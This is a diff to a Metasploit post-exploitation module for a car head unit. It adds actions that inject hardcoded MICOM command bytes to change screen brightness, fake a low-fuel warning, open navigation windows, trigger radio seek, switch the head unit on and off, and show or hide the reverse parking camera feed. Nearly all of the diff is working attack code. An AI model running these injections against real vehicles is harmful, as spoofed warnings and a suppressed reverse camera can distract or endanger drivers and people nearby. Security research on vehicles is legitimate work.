@@ -32,8 +32,19 @@ class MetasploitModule < Msf::Post
           ],
         'Actions' => [
           [ 'TOGGLE_RADIO_MUTE', { 'Description' => 'It mutes/umutes the radio' } ],
-          [ 'REDUCE_RADIO_VOLUME', { 'Description' => 'It reduces radio volume' } ],
+          [ 'REDUCE_RADIO_VOLUME', { 'Description' => 'It decreses the radio volume' } ],
           [ 'MAX_RADIO_VOLUME', { 'Description' => 'It sets the radio volume to the max' } ],
+          [ 'LOW_SCREEN_BRIGHTNESS', { 'Description' => 'It decreses the head unit screen brightness' } ],
+          [ 'HIGH_SCREEN_BRIGHTNESS', { 'Description' => 'It increases the head unit screen brightness' } ],
+          [ 'LOW_FUEL_WARNING', { 'Description' => 'It pops up a low fuel message on the head unit' } ],
+          [ 'NAVIGATION_FULL_SCREEN', { 'Description' => 'It pops up the navigation app window' } ],
+          [ 'SET_NAVIGATION_ADDRESS', { 'Description' => 'It pops up the navigation address window' } ],
+          [ 'SEEK_DOWN_SEARCH', { 'Description' => 'It triggers the seek down radio frequency search' } ],
+          [ 'SEEK_UP_SEARCH', { 'Description' => 'It triggers the seek up radio frequency search' } ],
+          [ 'SWITCH_ON_Hu', { 'Description' => 'It switches on the head unit' } ],
+          [ 'SWITCH_OFF_Hu', { 'Description' => 'It switches off the head unit' } ],
+          [ 'CAMERA_REVERSE_ON', { 'Description' => 'It shows the parking camera video stream' } ],
+          [ 'CAMERA_REVERSE_OFF', { 'Description' => 'It hides the parking camera video stream' } ],
           [ 'CHANGE_CLUSTER_LANGUAGE', { 'Description' => 'It changes the cluster language' } ],
           [ 'INJECT_CUSTOM', { 'Description' => 'It injects custom micom payloads' } ]
         ],
@@ -52,17 +63,15 @@ class MetasploitModule < Msf::Post
   end
 
   def send_in(m_cmd)
-    print_status(' -- Sending Command -- ')
     cmd = "#{datastore['MICOMD']} -c inject #{m_cmd}"
     cmd_exec(cmd)
-    print_good(' -- Command Sent-- ')
+    print_good(' -- Command Sent -- ')
   end
 
   def send_out(m_cmd)
-    print_status(' -- Sending Command -- ')
     cmd = "#{datastore['MICOMD']} -c inject-outgoing #{m_cmd}"
     cmd_exec(cmd)
-    print_good(' -- Command Sent-- ')
+    print_good(' -- Command Sent -- ')
   end
 
   def send_custom(m_cmd)
@@ -114,6 +123,61 @@ class MetasploitModule < Msf::Post
   def action_max_radio_volume
     print_status(' -- Max radio volume -- ')
     send_out('0112 F0')
+  end
+
+  def action_low_screen_brightness
+    print_status(' -- Low screen brightness -- ')
+    send_in('8353 07 01')
+  end
+
+  def action_high_screen_brightness
+    print_status(' -- High screen brightness -- ')
+    send_in('8353 07 00')
+  end
+
+  def action_low_fuel_warning
+    print_status(' -- Low fuel warning -- ')
+    send_in('8353 0B 01')
+  end
+
+  def action_navigation_full_screen
+    print_status(' -- Navigation windows full screen -- ')
+    send_in('8353 0C 01')
+  end
+
+  def action_set_navigation_address
+    print_status(' -- Navigation address window pops up -- ')
+    send_in('8353 0D 03')
+  end
+
+  def action_seek_down_search
+    print_status(' -- Seek down radio search -- ')
+    send_out('133 01')
+  end
+
+  def action_seek_up_search
+    print_status(' -- Seek up radio search -- ')
+    send_out('133 02')
+  end
+
+  def action_switch_on_hu
+    print_status(' -- Switch on Head unit -- ')
+    send_out('170 01')
+  end
+
+  def action_switch_off_hu
+    print_status(' -- Switch off Head unit -- ')
+    send_out('170 00')
+  end
+
+  def action_camera_reverse_on
+    print_status(' -- Parking camera video stream on -- ')
+    send_in('8353 03 01')
+  end
+
+  def action_camera_reverse_off
+    print_status(' -- Parking camera video stream off -- ')
+    send_in('8353 03 00')
   end
 
   def action_change_cluster_language
